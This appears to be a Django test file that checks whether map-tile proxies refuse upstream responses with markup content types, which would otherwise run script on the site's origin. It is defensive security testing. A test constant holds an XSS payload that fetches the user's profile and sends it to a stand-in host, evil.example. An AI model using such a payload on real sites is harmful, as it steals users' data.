"""A tile proxy serves whatever the upstream sent, under this deployment's own origin.

Both proxies pass the upstream ``Content-Type`` straight to the browser, and the basemap one is
``csp_exempt`` - a Content-Security-Policy governs what a document may load, so on a tile it is
1.2kB of header that can never apply, except that a response served as ``text/html`` *is* a
document. An upstream that answers a tile request with markup therefore gets that markup rendered
on this origin, kept for the week the tile cache-control asks for, from a URL that looks like a
PNG. ``image/svg+xml`` is the same attack in a type the word "image" covers.

REData is a sibling service rather than a stranger, which is the reason this is defence in depth
and not an open door - and also the reason it is worth having: the proxy is the only thing between
whatever REData's own upstreams return and a script tag on this origin.
"""

from __future__ import annotations

from unittest import mock

from django.contrib.auth.models import User
from django.core.cache import cache
from django.urls import reverse
from model_bakery import baker

from urbanlens.core.tests.testcase import TestCase

_BASEMAP_GATEWAY = "urbanlens.dashboard.services.apis.locations.redata_basemap_tiles_gateway.RedataBasemapTilesGateway"
_HISTORICAL_GATEWAY = (
    "urbanlens.dashboard.services.apis.locations.redata_historical_maps_gateway.RedataHistoricalMapsGateway"
)
_CONFIGURED = "urbanlens.dashboard.services.apis.locations.redata_context_gateway.redata_configured"

_SCRIPT = b"<script>fetch('/dashboard/rest/profiles/me/').then(r => r.text()).then(t => fetch('//evil.example/?' + t))</script>"

#: Every type that has ever been used to smuggle script through something that only looked like an
#: image, plus the ones a careless allow-list keeps.
_HOSTILE_TYPES = (
    "text/html",
    "text/html; charset=utf-8",
    "image/svg+xml",
    "application/xhtml+xml",
    "text/xml",
    "application/javascript",
)


class _TileCase(TestCase):
    def setUp(self) -> None:
        super().setUp()
        cache.clear()
        baker.make(User)  # absorbs the bootstrap site-admin promotion
        self.user = baker.make(User)
        self.client.force_login(self.user)


class ABasemapTileIsNeverADocumentTests(_TileCase):
    def setUp(self) -> None:
        super().setUp()
        self.url = reverse("map.basemap_tiles", kwargs={"layer": "usgs-topo", "z": 12, "x": 1204, "y": 1539})

    def _serve(self, body: bytes, content_type: str, times: int = 1):
        with (
            mock.patch(_CONFIGURED, return_value=True),
            mock.patch(f"{_BASEMAP_GATEWAY}.download_tile", return_value=(200, body, content_type)) as download,
        ):
            responses = [self.client.get(self.url) for _ in range(times)]
        return responses, download

    def test_markup_from_the_upstream_is_not_served_as_markup(self) -> None:
        for content_type in _HOSTILE_TYPES:
            with self.subTest(content_type=content_type):
                cache.clear()
                responses, _download = self._serve(_SCRIPT, content_type)

                self.assertNotEqual(responses[0].status_code, 200, f"{content_type} was served from this origin")
                self.assertNotIn(b"<script", responses[0].content)

    def test_an_unusable_answer_is_not_remembered_for_a_week(self) -> None:
        """A refusal cached per coordinate would keep the layer broken long after the upstream
        stopped sending markup, which is a worse outage than the one it is guarding."""
        _responses, download = self._serve(_SCRIPT, "text/html", times=2)

        self.assertEqual(download.call_count, 2, "the refusal was cached")

    def test_a_refusal_does_not_cost_the_client_five_attempts_per_tile(self) -> None:
        """An upstream sending markup will send it again. The client retries 408/429/502/503/504
        on a schedule of four attempts, and a viewport is ~30 tiles, so answering with one of
        those turns a layer that cannot be served into 150 calls to the upstream that cannot
        serve it."""
        import pathlib
        import re

        source = pathlib.Path(__file__).resolve().parents[2] / "frontend/ts/shared/own-tiles.ts"
        declared = re.search(r"RETRYABLE_STATUSES = new Set\(\[([^\]]*)\]\)", source.read_text())
        self.assertIsNotNone(declared, "the client's retry policy moved; this contract needs re-reading")
        retryable = {int(part) for part in declared.group(1).split(",") if part.strip()}

        responses, _download = self._serve(_SCRIPT, "text/html")

        self.assertNotIn(responses[0].status_code, retryable)

    def test_an_ordinary_tile_is_still_served(self) -> None:
        """Anti-vacuity: refusing everything would pass every test above."""
        responses, _download = self._serve(b"\x89PNG\r\n\x1a\n", "image/png")

        self.assertEqual(responses[0].status_code, 200)
        self.assertEqual(responses[0]["Content-Type"], "image/png")

    def test_a_vendor_that_names_no_type_is_still_served(self) -> None:
        """Assuming PNG for a tile with no declared type is the pre-existing behaviour, and the
        bytes are still not a document."""
        responses, _download = self._serve(b"\x89PNG\r\n\x1a\n", "")

        self.assertEqual(responses[0].status_code, 200)
        self.assertEqual(responses[0]["Content-Type"], "image/png")

    def test_the_browser_is_told_not_to_guess(self) -> None:
        """The allow-list decides what leaves this process; nosniff decides what the browser does
        with bytes that do not match the type. Neither covers the other."""
        responses, _download = self._serve(b"\x89PNG\r\n\x1a\n", "image/png")

        self.assertEqual(responses[0]["X-Content-Type-Options"], "nosniff")


class AHistoricalOverlayTileIsNeverADocumentTests(_TileCase):
    """The same proxy shape, one route over, which got none of the basemap proxy's hardening."""

    def setUp(self) -> None:
        super().setUp()
        self.url = reverse(
            "map.historical_tiles",
            kwargs={"georeference_uuid": "00000000-0000-4000-8000-000000000000", "z": 12, "x": 1204, "y": 1539},
        )

    def _serve(self, body: bytes, content_type: str, times: int = 1):
        with (
            mock.patch(_CONFIGURED, return_value=True),
            mock.patch(f"{_HISTORICAL_GATEWAY}.download_tile", return_value=(200, body, content_type)) as download,
        ):
            responses = [self.client.get(self.url) for _ in range(times)]
        return responses, download

    def test_markup_from_the_upstream_is_not_served_as_markup(self) -> None:
        for content_type in _HOSTILE_TYPES:
            with self.subTest(content_type=content_type):
                cache.clear()
                responses, _download = self._serve(_SCRIPT, content_type)

                self.assertNotEqual(responses[0].status_code, 200, f"{content_type} was served from this origin")
                self.assertNotIn(b"<script", responses[0].content)

    def test_an_ordinary_tile_is_still_served(self) -> None:
        responses, _download = self._serve(b"\x89PNG\r\n\x1a\n", "image/png")

        self.assertEqual(responses[0].status_code, 200)
        self.assertEqual(responses[0]["Content-Type"], "image/png")

    def test_the_browser_is_told_not_to_guess(self) -> None:
        responses, _download = self._serve(b"\x89PNG\r\n\x1a\n", "image/png")

        self.assertEqual(responses[0]["X-Content-Type-Options"], "nosniff")
